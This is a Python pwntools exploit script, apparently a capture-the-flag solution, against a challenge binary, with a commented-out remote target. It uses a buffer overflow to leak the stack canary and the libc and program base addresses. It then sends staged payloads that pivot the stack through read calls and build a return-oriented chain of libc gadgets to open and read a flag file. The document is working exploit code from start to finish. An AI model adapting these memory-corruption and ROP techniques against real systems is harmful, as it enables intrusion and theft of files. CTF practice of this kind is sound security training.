from pwn import *
context.arch = 'amd64'

def check(overflow):
    for i in range(0, 12):
        print(i, hex(u64(overflow[8 * i:8 * (i + 1)])))

# 0x0000000000045eb0 : pop rax ; ret #remote
# 0x000000000002a3e5 : pop rdi ; ret #remote
# 0x000000000002be51 : pop rsi ; ret #remote
# 0x0000000000090529 : pop rdx ; pop rbx ; ret #remote
# 0x0000000000114990 : syscall ; ret #remote
pop_rax_offset = 0x0000000000045eb0 #remote
pop_rdi_offset = 0x000000000002a3e5 #remote
pop_rsi_offset = 0x000000000002be51 #remote
#pop_rdx_rbx_offset = 0x0000000000090529 #remote
# 0x00000000000904a9 : pop rdx ; pop rbx ; ret
pop_rdx_rbx_offset = 0x00000000000904a9
#syscall_offset = 0x114990 #remote
# 0x4278e : syscall ; ret
syscall_offset = 0x4278e
read_offset = 0x1454 - 0x1331

#r = remote('10.113.184.121', 10056)
r = process(['release/share/chal'])
libc_start_offset = 0x29D90


r.recvuntil(b"Haaton's name? ")
r.sendline(b"1" * 19)
r.recvuntil(b"ECHO HACHAMA!\n")

r.send(b"HACHAMA\x00")
overflow = r.recv(ord('a'))

canary = overflow[8 * 7:8 * 8]
libc_base = u64(overflow[8 * 9:8 * 10]) - libc_start_offset
main_base = u64(overflow[8 * 11:8 * 12])
print("canary", hex(u64(canary)))
print("main_base", hex(main_base))
print("libc_base", hex(libc_base))
#
pop_rax = libc_base + pop_rax_offset
pop_rdi = libc_base + pop_rdi_offset
pop_rsi = libc_base + pop_rsi_offset
pop_rdx_rbx = libc_base + pop_rdx_rbx_offset
syscall = libc_base + syscall_offset
read = main_base + read_offset
bss = libc_base - 0x2000
#

raw_input("debug")
rop = flat([bss, read])
payload = b"XACHAMA\x00" + b'a' * (8 * 6) + canary + rop
r.send(payload.ljust(ord('a'), b'\x00'))

rop = flat([bss + 0x30, read])
payload = b'/home/chal/flag.txt\x00'.ljust(0x30, b'\x00') + b"HACHAMA\x00" + canary + rop
r.send(payload.ljust(ord('a'), b'\x00'))

rop = flat([bss + 0x30 * 2, read])

magic_rop = flat([pop_rax, 0x2,
                  pop_rdi, bss - 0x40,
                  pop_rsi, 0,])

payload = magic_rop + b"HACHAMA\x00" + canary + rop
r.send(payload.ljust(ord('a'), b'\x00'))

rop = flat([bss + 0x30 * 3, read])

magic_rop = flat([pop_rdx_rbx, 0, 0,
                  syscall, 
                  pop_rax, 0x0,])

payload = magic_rop + b"HACHAMA\x00" + canary + rop
r.send(payload.ljust(ord('a'), b'\x00'))

rop = flat([bss + 0x30 * 4, read])

payload = b"HACHAMA\x00" + magic_rop +  canary + rop
r.send(payload.ljust(ord('a'), b'\x00'))
overflow = r.recv(ord('a'))
check(overflow)

r.interactive()
exit()
